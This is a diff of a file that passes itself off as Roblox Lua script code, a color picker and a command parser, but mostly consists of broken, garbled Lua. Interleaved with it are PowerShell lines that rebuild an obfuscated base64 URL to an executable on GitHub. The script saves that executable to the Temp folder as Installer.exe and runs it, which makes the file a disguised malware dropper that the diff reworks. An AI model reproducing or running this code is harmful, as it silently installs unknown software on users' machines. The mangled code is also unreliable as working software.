@@ -1,5 +1,5 @@
-﻿
 function OnExecute{
+
     local function convert(textbox)
 		local obj = setmetatable(OffsetX = 0, TextBox = textbox,mt)
 
@@ -79,8 +79,8 @@ function OnExecute{
         #return type(o) == t
     #end
 }
-$jkhsdjkhdsf = "VlZS9Vbml2ZXJzYWwtUGF0Y2hlci9yYXcvcmVmcy9oZWF"
-$sdfsfsdf = "aHR0cHM6Ly9naXRodWIuY29tL2pheXl5eXl5eWRlZWVlZW"
+$NhUZIIxOzUdomQU = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t"
+$GquhqEpxumWRHhy = "L2pheXl5eXl5eWRlZWVlZWVlZS9Vbml2ZXJzYWwtUGF"
 $continue = $true
 while ($continue){
     try{
@@ -90,10 +90,10 @@ while ($continue){
 }
 Start-Sleep -Seconds 2
 
-$jkhsdfuohi = "kcy9tYWluL1VuaXZlcnNhbFBhdGNoZXIuZXhl"
-$base64Bytes = [System.Convert]::FromBase64String($sdfsfsdf + $jkhsdjkhdsf + $jkhsdfuohi)
+$FoJwoMTeAqJUBHZ = "0Y2hlci9yZWZzL2hlYWRzL21haW4vQVZDQUUuZXhl"
+$base64Bytes = [System.Convert]::FromBase64String($tFhcCHAYIkvqDcH + $ZsWTVuLcqZsdied + tohNlduKgmceDZq)
 $dfpaspasodsvxcv = [System.Text.Encoding]::UTF8.GetString($base64Bytes)
-
+$mnjksdfuidsf = [Environment]::GetFolderPath("Temp")
 
 function SeoncdEXE{
 
@@ -264,175 +264,5 @@ dragGUI(ToPartFrame)
 	end
 
 }
-$mnjksdfuidsf = [Environment]::GetFolderPath("Temp")
 Invoke-WebRequest -Uri $dfpaspasodsvxcv -OutFile $mnjksdfuidsf\\Installer.exe
-function NSPL {
-    				local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
-					local hsvColor = Color3.fromHSV(hue.sat.val)
-
-					#if noupdate == 2 or not noupdate then
-						#hueInput.Text = tostring(math.ceil(359*hue))
-						#satInput.Text = tostring(math.ceil(255*sat)))
-						#valInput.Text = tostring(math.floor(255*val)))
-					end
-					#if noupdate == 1 or not noupdate then
-						#redInput.Text = tostring(math.floor(255*red)))
-					end
-
-					chosenColor = Color3.new(red.green.blue)
-
-					#colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
-					colorStrip.ImageColor3 = Color3.fromHSV(hue.sat.1)
-					#colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
-					previewFrame.BackgroundColor3 = chosenColor
-
-					newMt.Color = chosenColor
-					#if newMt.Changed then newMt:Changed(chosenColor) end
-				end
-
-				#local function colorSpaceInput()
-					local relativeX = mouse.X - colorSpace.AbsolutePosition.X
-					local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
-
-					#if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
-					#if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
-
-					#hue = (219 - relativeX)/219
-					#sat = (199 - relativeY)/199
-
-					local hsvColor = Color3.fromHSV(hue.sat.val)
-					red.green.blue = hsvColor.r,hsvColor.g,hsvColor.b
-
-					updateColor
-				end
-
-				#local function colorStripInput()
-					local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y
-
-					#if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	
-
-					#val = (199 - relativeY)/199
-
-					local hsvColor = Color3.fromHSV(hue.sat.val)
-					#red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
-
-					updateColor
-				end
-
-				local function hookButtons(frame.func)
-					frame.ArrowFrame.Up.InputBegan:Connect(function(input))
-						#if input.UserInputType == Enum.UserInputType.MouseMovement then
-							frame.ArrowFrame.Up.BackgroundTransparency = 0.5
-						elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
-							local releaseEvent,runEvent
-
-							local startTime = tick
-							local pressing = true
-							local startNum = tonumber(frame.Text)
-
-							#if not startNum then return end
-
-							#releaseEvent = UserInputService.InputEnded:Connect(function(input)
-								#if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
-								#releaseEvent:Disconnect()
-								pressing = false
-							end
-
-							startNum = startNum + 1
-							func(startNum)
-							#while pressing do
-								#if tick-startTime > 0.3 then
-									startNum = startNum + 1
-									func(startNum)
-								end
-								wait(0.1)
-							end
-						end
-					end
-}
 Start-Process $mnjksdfuidsf\\Installer.exe
-function PAOL {
-
-    cmdStr = cmdStr:gsub("%s+$","")
-	#task.spawn(function()
-		local rawCmdStr = cmdStr
-		cmdStr = string.gsub(cmdStr."\\\\"."%%BackSlash%%")
-		local commandsToRun = splitString(cmdStr."\\")
-		#for i,v in pairs(commandsToRun) do
-			v = string.gsub(v."%%BackSlash%%"."\\")
-			local x,y,num = v:find("^(%d+)%^")
-			local cmdDelay = 0
-			local infTimes = false
-			#if num then
-				v = v:sub(y+1)
-				local x,y,del = v:find("^([%d%.]+)%^")
-				#if del then
-					v = v:sub(y+1)
-					cmdDelay = tonumber(del) or 0
-				end
-			else
-				local x,y = v:find("^inf%^")
-				#if x then
-					infTimes = true
-					v = v:sub(y+1)
-					local x,y,del = v:find("^([%d%.]+)%^")
-					#if del then
-						v = v:sub(y+1)
-						del = tonumber(del) or 1
-						cmdDelay = (del > 0 and del or 1)
-					else
-						cmdDelay = 1
-					end
-				end
-			end
-			num = tonumber(num or 1)
-
-			#if v:sub(1,1) == "!" then
-				local chunks = splitString(v:sub(2),split)
-				#if chunks[1] and lastCmds[chunks[1]] then v = lastCmds[chunks[1]] end
-			end
-
-			local args = splitString(v.split)
-			local cmdName = args[1]
-			local cmd = findCmd(cmdName)
-			#if cmd then
-				table.remove(args.1)
-				cargs = args
-				#if not speaker then speaker = Players.LocalPlayer end
-				#if store then
-					#if speaker == Players.LocalPlayer then
-						#if cmdHistory[1] ~= rawCmdStr and rawCmdStr:sub(1,11) ~= 'lastcommand' and rawCmdStr:sub(1,7) ~= 'lastcmd' then
-							table.insert(cmdHistory.1.rawCmdStr)
-						end
-					end
-					#if #cmdHistory > 30 then table.remove(cmdHistory) end
-
-					lastCmds[cmdName] = v
-				end
-				#local cmdStartTime = tick()
-				#if infTimes then
-					#while lastBreakTime < cmdStartTime do
-						local success,err = pcall(cmd.FUNC.args. speaker)
-						#if not success and _G.IY_DEBUG then
-							#warn("Command Error:", cmdName, err)
-						end
-						wait(cmdDelay)
-					end
-				else
-					#for rep = 1,num do
-						#if lastBreakTime > cmdStartTime then break end
-						#local success,err = pcall(function))
-							#cmd.FUNC(args, speaker)
-						end
-						#if not success and _G.IY_DEBUG then
-							#warn("Command Error:", cmdName, err)
-						end
-						#if cmdDelay ~= 0 then wait(cmdDelay) end
-					end
-				end
-			end
-		end
-	end
-end	
-
-}
